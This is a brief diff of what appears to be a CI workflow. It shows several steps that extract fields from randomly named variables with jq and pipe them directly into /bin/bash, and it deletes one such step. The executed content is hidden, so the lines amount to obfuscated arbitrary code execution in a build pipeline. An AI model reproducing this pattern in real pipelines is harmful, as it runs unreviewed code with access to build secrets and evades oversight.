@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$ban741" | jq -r .s83524 | /bin/bash
           echo $bh596 | jq -r .efbua64 | /bin/bash
           echo $mbe2327 | jq -r .odeep022 | /bin/bash
-          echo $pe32975 | jq -r .kkcsb849 | /bin/bash
           printf '%s' "$wxfm48" | jq -r .iws67 | /bin/bash
 
       - name: Store artifact
